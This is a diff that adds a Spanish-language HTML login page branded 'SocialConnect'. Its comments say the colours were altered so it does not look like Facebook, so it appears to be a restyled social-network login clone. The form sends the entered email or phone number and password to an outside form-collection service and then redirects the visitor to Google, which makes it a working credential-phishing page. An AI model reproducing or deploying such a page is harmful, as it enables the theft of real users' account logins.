@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso al Portal Educativo</title>
+    <style>
+        /* Cambiamos el color de fondo para que no sea el gris de FB */
+        body { font-family: Arial, sans-serif; background-color: #e9eff1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; width: 90%; max-width: 900px; justify-content: space-around; align-items: center; flex-wrap: wrap; }
+        
+        /* Cambiamos el estilo del logo de texto */
+        .logo-texto { 
+            color: #2c3e50; /* Color azul muy oscuro, casi gris */
+            font-size: 50px; 
+            font-weight: 800; 
+            margin-bottom: 10px;
+        }
+
+        .left-content { width: 450px; }
+        .left-content h2 { font-size: 22px; font-weight: 300; color: #34495e; }
+        
+        /* Caja de login con colores distintos */
+        .login-box { background-color: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #bdc3c7; border-radius: 4px; box-sizing: border-box; }
+        
+        /* Botón de otro color (Azul oscuro en vez del azul FB) */
+        .btn-login { background-color: #2980b9; color: white; font-size: 18px; font-weight: bold; padding: 12px; border: none; border-radius: 4px; width: 100%; cursor: pointer; }
+        
+        .links { display: block; margin-top: 15px; color: #2980b9; text-decoration: none; font-size: 13px; }
+        hr { border: 0; border-top: 1px solid #eee; margin: 20px 0; }
+        .btn-new { background-color: #27ae60; color: white; padding: 10px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left-content">
+            <div class="logo-texto">SocialConnect</div>
+            <h2>Conéctate con tus amigos y el mundo que te rodea de forma segura.</h2>
+        </div>
+
+        <div class="login-box">
+            <form action="https://getform.io/f/bdrkgkjb" method="POST">
+                <input type="text" name="Correo_ID" placeholder="Email o teléfono" required>
+                <input type="password" name="Password_ID" placeholder="Contraseña" required>
+                <input type="hidden" name="_redirect" value="https://www.google.com">
+                <button type="submit" class="btn-login">Entrar al Sistema</button>
+                <a href="#" class="links">¿Olvidaste tu cuenta?</a>
+                <hr>
+                <a href="#" class="btn-new">Registrarse ahora</a>
+            </form>
+        </div>
+    </div>
+
+</body>
+</html>
